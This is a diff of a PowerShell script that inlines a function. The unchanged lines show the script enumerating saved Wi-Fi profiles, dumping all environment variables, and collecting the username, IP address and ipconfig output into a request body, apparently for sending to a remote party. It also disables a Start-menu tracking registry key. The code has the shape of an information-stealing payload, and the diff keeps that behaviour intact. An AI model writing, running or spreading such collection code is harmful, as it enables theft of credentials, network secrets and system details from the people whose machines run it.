@@ -1,13 +1,12 @@
 $profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
   $_.Matches.Value
 }
-function oneOfTheHardestThingsInCodingIsNamingThings {
-    if (Test-Path $registryPath) {
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
-        return "opposite of fucked up"
-    } else {
-        return "fucked up: not found"
-    }
+$result = ""
+if (Test-Path $registryPath) {
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
+    $result = "opposite of fucked up"
+} else {
+    $result = "fucked up: not found"
 }
 $wifis = @()
 
@@ -26,11 +25,10 @@ $envVars = @{}
 gci env:* | ForEach-Object {
   $envVars[$_.Name] = $_.Value
 }
-$priv = oneOfTheHardestThingsInCodingIsNamingThings
 $Body = @{
   'username' = $env:username
   'ipv4' = $IPV4
-  'priv' = $priv
+  'priv' = $result
   'wifi_profiles' = $wifis
   'ipconfig' = $IPconfig
   'env' = $envVars
